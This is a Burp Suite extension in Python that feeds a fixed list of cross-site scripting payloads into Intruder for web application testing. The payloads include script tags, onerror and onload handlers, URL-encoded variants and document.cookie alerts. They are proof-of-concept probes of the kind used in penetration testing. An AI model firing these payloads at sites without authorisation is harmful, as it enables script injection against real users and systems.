# -*- coding: utf-8 -*-

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator

class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("XSS Injection Payload Generator")
        self._callbacks.registerIntruderPayloadGeneratorFactory(self)
        print("XSS Injection Payload Generator loaded")
    
    def getGeneratorName(self):
        return "XSS Injection Payloads"
    
    def createNewInstance(self, attack):
        return XSSPayloadGenerator()

class XSSPayloadGenerator(IIntruderPayloadGenerator):
    def __init__(self):
        self.payloads = [
           "<a onbeforeunload=alert('document.cookie') contenteditable>test</a>",
           "<script>alert('XSS')</script>",
           "<SCRIPT>alert('XSS')</SCRIPT>",
           "<script>alert(document.cookie)</script>",
           "<font color=green>XSS</font>",
           "<img src=x onerror=alert('Hacked')>",
           "<img src=x onerror=alert(document.cookie)>",
           "%3Cimg%20src%2Fonerror%3Dalert%28document.cookie%29%3E",
           "<body onload=alert('XSS')>",
           "<a onbeforeunload=alert('XSS Payload') contenteditable>test</a>",
           "<a oncut=alert(1234) value='XSS' autofocus tabindex=1>test</a>",
           "<script>onerror=alert;throw 1</script>",
           "<script>location='javascript:alert\x281\x29'</script>", #No parentheses using location redirect
           "%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E"
        ]
        
        self.index = 0
    
    def hasMorePayloads(self):
        return self.index < len(self.payloads)
    
    def getNextPayload(self, baseValue):
        payload = self.payloads[self.index]
        self.index += 1
        return payload
    
    def reset(self):
        self.index = 0